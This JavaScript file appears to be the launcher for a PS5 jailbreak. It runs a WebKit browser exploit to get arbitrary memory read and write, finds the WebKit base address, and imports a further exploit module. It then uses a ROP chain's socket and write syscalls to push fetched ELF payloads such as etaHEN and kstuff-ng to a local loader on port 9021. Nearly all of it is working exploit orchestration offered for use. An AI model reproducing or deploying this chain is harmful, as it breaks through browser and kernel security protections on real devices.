import { establishPrimitive } from "./webkit.js";
import { installWindowP } from "./utils/mem.js";

const output = document.getElementById("console");

function writeLog(message, type = "log", replace = false) {
  let line = replace ? output.lastElementChild : null;
  if (!line) {
    line = document.createElement("div");
    output.appendChild(line);
  }
  let marker = "*";
  if (type === "error") marker = "-";
  if (type === "info" || type === "success") marker = "+";
  line.textContent = `[${marker}] ${message}`;
  output.scrollTop = output.scrollHeight;
}

function writeEvent(name, detail, type) {
  writeLog(detail == null || detail === "" ? name : `${name}: ${detail}`,
    type || (name === "Failed" ? "error" : "log"));
}

window.writeLog = writeLog;
window.jb = { mark: writeEvent };

async function getPrimitive() {
  writeLog("Starting WebKit exploit");
  const primitive = installWindowP(await establishPrimitive(writeEvent));
  if (!primitive || typeof primitive.read8 !== "function")
    throw new Error("Memory primitive unavailable");

  writeLog("ARW ready", "success");
  return primitive;
}

function getWebKitBase() {
  const ctor = globalThis.__ps5NativeCtor;
  if (typeof ctor !== "number" || typeof OFFSET_wk_host_constructor_candidates === "undefined")
    throw new Error("WebKit base inputs are unavailable");

  for (const offset of OFFSET_wk_host_constructor_candidates) {
    const base = ctor - offset;
    if (base >= 0x800000000 && base < 0x900000000 && base % 0x4000 === 0)
      return base;
  }

  throw new Error("WebKit base not found");
}

const AUTO_PAYLOADS = ["a53_ppr_install.elf", "kstuff-ng.elf", "shadowmountplus.elf", "etaHEN.elf"];

async function sendPayloadViaChain(name, chain, p) {
  writeLog(`Loading ${name}...`, "info");
  const response = await fetch("payloads/" + name);
  if (!response.ok) {
    writeLog(`${name}: HTTP ${response.status}`, "error");
    return false;
  }
  const data = new Uint8Array(await response.arrayBuffer());
  writeLog(`${name}: ${data.length} bytes fetched, connecting to elfldr...`, "info");

  const AF_INET = 2, SOCK_STREAM = 1;
  const fd = await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0);
  if (fd.low < 0 || fd.low > 0xffff) {
    writeLog(`${name}: socket() failed`, "error");
    return false;
  }

  const sockaddr = p.malloc(16);
  p.write1(sockaddr, 16);
  p.write1(sockaddr.add32(1), AF_INET);
  p.write1(sockaddr.add32(2), (9021 >> 8) & 0xff);
  p.write1(sockaddr.add32(3), 9021 & 0xff);
  p.write4(sockaddr.add32(4), 0x0100007f);

  const conn = await chain.syscall(SYS_CONNECT, fd.low, sockaddr, 16);
  if (conn.low !== 0) {
    writeLog(`${name}: connect() failed (${conn.low})`, "error");
    await chain.syscall(SYS_CLOSE, fd.low);
    return false;
  }

  const CHUNK = 0x4000;
  const buf = p.malloc(CHUNK);
  let sent = 0;
  while (sent < data.length) {
    const remain = Math.min(CHUNK, data.length - sent);
    for (let i = 0; i < remain; i += 4) {
      const end = Math.min(i + 4, remain);
      let val = 0;
      for (let b = i; b < end; b++) val |= data[sent + b] << ((b - i) * 8);
      p.write4(buf.add32(i), val);
    }
    const w = await chain.syscall(SYS_WRITE, fd.low, buf, remain);
    if (w.low <= 0) {
      writeLog(`${name}: write() failed at offset ${sent}`, "error");
      break;
    }
    sent += w.low;
    if (sent % (CHUNK * 16) === 0 || sent >= data.length)
      writeLog(`${name}: ${sent}/${data.length} bytes`, "info", true);
  }

  await chain.syscall(SYS_CLOSE, fd.low);

  if (sent >= data.length) {
    writeLog(`${name}: sent OK (${sent} bytes)`, "success");
    await new Promise(r => setTimeout(r, 2000));
    return true;
  }
  return false;
}

async function autoLoadPayloads(chain, p) {
  writeLog("Auto-loading payloads via ROP chain...", "info");
  await new Promise(r => setTimeout(r, 3000));
  for (const name of AUTO_PAYLOADS) {
    await sendPayloadViaChain(name, chain, p);
  }
  writeLog("All payloads processed", "success");
}

async function run() {
  const rejection = window.firmware.rejection();
  if (rejection)
    throw new Error(rejection);
  writeLog("Credits: ntfargo, ufm42, Sonic_Iso, Jordy, Dr. Yenyen, TheFlow, SlidyBat, Flatz, cow, nhk, bollarz, Sleirsgoevy, EchoStretch, EarthOnion", "info");
  writeLog(`Agent: ${navigator.userAgent}`, "info");
  writeLog(`Firmware: ${window.fw_str}`, "info");
  const primitive = await getPrimitive();
  writeLog(`WebKit base: 0x${getWebKitBase().toString(16)}`, "info");

  await import("./relapse_exploit.js");
  const result = await main(primitive);

  if (result && result.done && result.payloads && window.__ropChain && window.__ropRuntime) {
    await autoLoadPayloads(window.__ropChain, window.__ropRuntime);
  }
}

run().catch((error) => writeLog(error instanceof Error ? error.message : String(error), "error"));
